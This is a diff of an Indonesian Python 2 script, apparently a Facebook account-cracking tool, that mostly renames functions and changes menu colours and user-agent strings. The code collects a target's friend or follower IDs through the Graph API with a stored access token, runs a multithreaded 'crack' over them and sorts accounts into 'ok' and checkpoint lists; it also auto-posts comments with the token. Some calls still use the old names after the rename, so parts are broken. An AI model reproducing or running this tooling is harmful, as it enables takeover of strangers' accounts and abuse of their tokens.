@@ -11,7 +11,7 @@ try:
 except ImportError:
     os.system('pip2 install requests')
 
-def jeeck(z):
+def raka(z):
     for e in z + '\n':
         sys.stdout.write(e)
         sys.stdout.flush()
@@ -23,12 +23,14 @@ cp = []
 ok = []
 
 # Pastikan Jangan Ubah Bot Komen & Follownya :v #
+ua = ('BlackBerry7100i/4.1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/103')
+ua = ('BlackBerry7130e/4.1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/104')
 ua = ('Lenovo-A850/S105 Linux/3.4.0 Android/4.2 Release/06.12.2013 Browser/AppleWebKit534.30 Profile/ Configuration/ Safari/534.30')
 # Cek hasil okeh
 def __hasil_ok_cp__():
-	jeeck("\n \033[0;36m[\033[0;35m01\033[0;36m]\033[0;00m Lihat hasil ok")
-	jeeck(" \033[0;36m[\033[0;35m02\033[0;36m]\033[0;00m Lihat hasil cp")
-	jeeck(" \033[0;36m[\033[0;35m03\033[0;36m]\033[0;00m Exit")
+	raka("\n \033[0;36m[\033[0;35m01\033[0;36m]\033[0;00m Lihat hasil ok")
+	raka(" \033[0;36m[\033[0;35m02\033[0;36m]\033[0;00m Lihat hasil cp")
+	raka(" \033[0;36m[\033[0;35m03\033[0;36m]\033[0;00m Exit")
 	has = raw_input("\n \033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m Input : ")
 	if has == '':
 		exit(" \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Wronk input")
@@ -49,13 +51,13 @@ def __hasil_ok_cp__():
 komenredem = random.choice(['Bang Lu krend bang!', 'Bang Lu Cakep Tapi Sayang pacarnya cuma satu ?', 'Siang Luting Malam Jadi Kang Ghosting', 'Dah Lah Abng Cakep Banget :) ', 'Siang Panen Pahala Malam Panen Kepala', 'Arigato Atas Scnya Bang', 'Semoga Abang Dan Keluarga Masuk Surga :)', 'Semoga Abang Sukses', 'Gua Pengguna Sc cr4ck Lu Bang ', 'Wih Panutan Gua Nih', 'Senseii Kawaiine'])
 komtwol = random.choice(['Salam 2 Jari Bang', 'Mantap Sensei', 'bang punya pacar cuma satu wkwk ?', 'MengKeren Lah Bang', 'Semangat Bang!', 'Gua Murid Lu Bang', 'Tumben Post Bang?', 'Gua Pengin Jadi Kek Abang', 'Semoga Abang Jadi Orang Sukses', 'Bjir Lawack Kali Kau Bang'])
 kartu2d = random.choice(["poko ny Abang krend\nsampah bat lu bang","waduh sampah lu bang","wibu hengker ni bang","judul anime apa bang?","bjir kawai bang","bang lapor gua habis coli","mantap bang","salam buat kluarga bang :v"])
-def __komen_token__():
+def __sayang_amanda__():
     try:
         token = open('login.txt', 'r').read()
     except IOError:
         print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Token/Cookie invalid'
         os.system('rm -rf login.txt')
-        exit(_jeeckxnano.login())
+        exit(_rakasayangamanda.login())
     kom = komenredem
     komentar = komtwol
     yotsuba = kartu2d
@@ -79,17 +81,17 @@ def __komen_token__():
     __menu__()
 
 
-def __naruto_X_nano__():
+def __raka_sayang_amanda__():
 	os.system('clear')
-	print(_jeeck_banner_)
-	jeeck("\n \033[0;36m[\033[0;35m01\033[0;36m]\033[0;00m Login Menggunakan Token Facebook")
-	jeeck(" \033[0;36m[\033[0;35m02\033[0;36m]\033[0;00m Cara Mengambil Token Facebook")
-	jeeck(" \033[0;36m[\033[0;35m03\033[0;36m]\033[0;00m Exit")
-        masuk = raw_input("\n \033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m Input : ")
+	print(_raka_banner_)
+	raka("\n \033[0;37m[\033[0;36m1\033[0;37m]\033[0;00m Login Menggunakan Token Facebook")
+	raka(" \033[0;37m[\033[0;36m2\033[0;37m]\033[0;00m Cara Mengambil Token Facebook")
+	raka(" \033[0;37m[\033[0;36m3\033[0;37m]\033[0;00m Exit")
+        masuk = raw_input("\n \033[0;37m[\033[0;36m+\033[0;37m]\033[0;00m Input : ")
         if masuk == "":
-                exit(" \033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m Wronk Input")
+                exit(" \033[0;37m[\033[0;36m+\033[0;37m]\033[0;00m Wronk Input")
         elif masuk == "1":
-		token = raw_input(" \033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m Token : ")
+		token = raw_input(" \033[0;37m[\033[0;36m+\033[0;37m]\033[0;00m Token : ")
 		try:
                 	y = requests.get('https://graph.facebook.com/me?access_token='+token)
 	                x = json.loads(y.text)
@@ -97,22 +99,22 @@ def __naruto_X_nano__():
 	                save = open("login.txt", 'w')
 	                save.write(token)
 	                save.close()
-	                __komen_token__()
+	                __sayang_amanda__()
 	        except KeyError:
-			jeeck(" \033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m Token invallid")
+			raka(" \033[0;37m[\033[0;36m+\033[0;37m]\033[0;00m Token invallid")
 	                time.sleep(3)
-	                __naruto_X_nano__()
+	                __raka_sayang_amanda__()
 	        except requests.exceptions.SSLError:
-	                exit(" \033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m Token Invallid")
+	                exit(" \033[0;37m[\033[0;36m+\033[0;37m]\033[0;00m Token Invallid")
         elif masuk == "2":
-		jeeck(" \033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m Anda akan diarahkan ke youtube")
+		raka(" \033[0;37m[\033[0;36m+\033[0;37m]\033[0;00m Anda akan diarahkan ke youtube")
                 time.sleep(3)
 		os.system("xdg-open https://youtu.be/bszAm4C5ovE")
                 exit()
         elif masuk == "0":
                 exit()
         else:
-		exit(" \033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m Wronk input")
+		exit(" \033[0;37m[\033[0;36m+\033[0;37m]\033[0;00m Wronk input")
 _jeeck_banner_ = ("""
 \033[0;36m   _____ _                 __   
 \033[0;36m  / ___/(_)___ ___  ____  / /__     \033[0;33m•\033[0;00m Angga & Raka \033[0;33m•
@@ -126,56 +128,56 @@ def __menu__():
         try:
                 token = open('login.txt','r').read()
         except IOError:
-		jeeck(" \033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m Token invallid")
+		raka(" \033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m Token invallid")
                 os.system('rm -rf login.txt')
 		time.sleep(2)
-                __naruto_X_nano__()
+                __raka_sayang_amanda__()
         try:
-                p = requests.get('https://graph.facebook.com/me?access_token=' +token)
+                p = requests.get('https://graph.facebook.com/me?access_token='+token)
                 q = json.loads(p.text)
                 name = q['name']
 		birthday = q['birthday']
         except KeyError:
-		jeeck(" \033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m Token invallid")
+		raka(" \033[0;37m[\033[0;36m+\033[0;37m]\033[0;00m Token invallid")
                 os.system('rm -rf login.txt')
 		time.sleep(3)
-		__naruto_X_nano__()
+		__raka_sayang_amanda__()
         except requests.exceptions.ConnectionError:
-		jeeck(" \033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m Tidak ada koneksi internet");exit
+		raka(" \033[0;37m[\033[0;36m+\033[0;37m]\033[0;00m Tidak ada koneksi internet");exit
         os.system('clear')
-	print(_jeeck_banner_)
-	print("\n \033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m Nama account : " +name)
-	print(" \033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m Tanggal lahir : "+birthday)
-	jeeck("\n \033[0;36m[\033[0;35m01\033[0;36m]\033[0;00m Crack id dari publik")
-	print(" \033[0;36m[\033[0;35m02\033[0;36m]\033[0;00m Crack id dari followers")
-	print(" \033[0;36m[\033[0;35m03\033[0;36m]\033[0;00m Chek results crack")
-	jeeck(" \033[0;36m[\033[0;35m00\033[0;36m]\033[0;00m Remove [ TOKEN ]")
-	_naruto_kurama_ = raw_input("\n \033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m Input : ")
+	print(_raka_banner_)
+	print("\n \033[0;37m[\033[0;36m+\033[0;37m]\033[0;00m Nama Account : " +name)
+	print(" \033[0;37m[\033[0;36m+\033[0;37m]\033[0;00m Tanggal Lahir  : "+birthday)
+	jeeck("\n \033[0;37m[\033[0;36m1\033[0;37m]\033[0;00m Crack Id Dari Publik")
+	print(" \033[0;37m[\033[0;36m2\033[0;37m]\033[0;00m Crack Id Dari Followers")
+	print(" \033[0;37m[\033[0;36m3\033[0;37m]\033[0;00m Chek Results Crack")
+	jeeck(" \033[0;37m[\033[0;36m0\033[0;37m]\033[0;00m Remove Token")
+	_naruto_kurama_ = raw_input("\n \033[0;37m[\033[0;36m+\033[0;37m]\033[0;00m Input : ")
 	if _naruto_kurama_ == "":
-		jeeck(" \033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m Wronk input ");exit
+		raka(" \033[0;37m[\033[0;36m+\033[0;37m]\033[0;00m Wronk input ");exit
 	elif _naruto_kurama_ == "1" or _naruto_kurama_ == "01":
-		idt = raw_input(" \033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m Target : ")
+		idt = raw_input(" \033[0;37m[\033[0;36m+\033[0;37m]\033[0;00m Target : ")
 		try:
 			token=open('login.txt','r').read()
 			pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
 			sp = json.loads(pok.text)
-			jeeck(" \033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m Nama : "+sp["name"])
+			raka(" \033[0;37m[\033[0;36m+\033[0;37m]\033[0;00m Nama : "+sp["name"])
 		except KeyError:
-			jeeck(" \033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m Target tidak ditemukan");exit
+			raka(" \033[0;37m[\033[0;36m+\033[0;37m]\033[0;00m Target tidak ditemukan");exit
 		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token)
 		z = json.loads(r.text)
 		for i in z["data"]:
 			uid = i['id']
 			id.append(uid)
 	elif _naruto_kurama_ == "2" or _naruto_kurama_ == "02":
-		idt = raw_input(" \033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m Target : ")
+		idt = raw_input(" \033[0;37m[\033[0;36m+\033[0;37m]\033[0;00m Target : ")
 		try:
 			token=open('login.txt','r').read()
 			pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
 			sp = json.loads(pok.text)
-			jeeck(" \033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m Nama : "+sp["name"])
+			raka(" \033[0;37m[\033[0;36m+\033[0;37m]\033[0;00m Nama : "+sp["name"])
 		except KeyError:
-			jeeck(" \033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m Target tidak di temukan");exit
+			raka(" \033[0;37m[\033[0;36m+\033[0;37m]\033[0;00m Target tidak di temukan");exit
 		r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=5000&access_token="+token)
 		z = json.loads(r.text)
 		for i in z["data"]:
@@ -186,10 +188,10 @@ def __menu__():
 	elif _naruto_kurama_ == "0" or _naruto_kurama_ == "00":
 		os.system("rm -f login.txt")
 		time.sleep(3)
-		jeeck(" \033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m Terimakasih telah terhubung di tools saya");exit
+		raka(" \033[0;37m[\033[0;36m+\033[0;37m]\033[0;00m Terimakasih telah terhubung di tools saya");exit
 	else:
-		jeeck(" \033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m Wronk input");exit
-	jeeck(" \033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m Total id : "+str(len(id)))
+		raka(" \033[0;37m[\033[0;36m+\033[0;37m]\033[0;00m Wronk input");exit
+	raka(" \033[0;37m[\033[0;36m+\033[0;37m]\033[0;00m Total id : "+str(len(id)))
 	print(' ')
 	def main(arg):
 		global ok,cp,ua, loop
@@ -247,7 +249,7 @@ def __menu__():
 			pass
 	p = ThreadPool(30)
 	p.map(main, id)
-	jeeck(" \033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m Cracking Finised ");exit
+	raka(" \033[0;37m[\033[0;36m+\033[0;37m]\033[0;00m Cracking Finised ");exit
 
 if __name__=='__main__':
 	os.system('git pull')
